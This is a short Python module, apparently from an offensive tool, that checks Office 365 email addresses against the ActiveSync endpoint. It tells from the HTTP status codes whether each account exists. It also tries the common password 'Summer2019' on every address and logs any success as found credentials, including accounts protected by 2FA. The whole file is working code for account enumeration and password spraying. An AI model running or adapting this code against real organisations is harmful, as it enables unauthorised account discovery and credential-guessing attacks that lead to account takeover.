from lib import logger
import requests

def validate(email):
	try:
		# The password here doesnt really matter as the o365 link just requires anything, but its worthwhile having a common password in order to check for access at the same time
		password='Summer2019'
		url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
		headers = {"MS-ASProtocolVersion": "14.0"}
		auth = (email, password)

		try:
			logger.verbose('Attempting to validate %s' % logger.YELLOW(email))
			r = requests.options(url, headers=headers, auth=auth)
			status = r.status_code
		except:
			logger.verbose('Unable to connect to [%s]' % logger.RED(url))
			quit()

		if status == 401:
			logger.verbose('Successfully validated %s' % logger.GREEN(email))
			return True

		elif status == 404:
			logger.verbose('Could not validate %s' % logger.RED(email))
			return False

		elif status == 403:
			logger.green('Found credentials: %s:%s (2FA)' % (logger.GREEN(email),logger.GREEN(password)))
			return [True,password]

		elif status == 200:
			logger.green('Found credentials: %s:%s' % (logger.GREEN(email),logger.GREEN(password)))
			return [True,password]
		else:
			logger.verbose('Got HTTP Status Response %s. Unexpected, skipping.' % logger.RED(str(status)))
			return None

	except KeyboardInterrupt:
		logger.yellow('Keyboard interrupt detected!')
		quit()
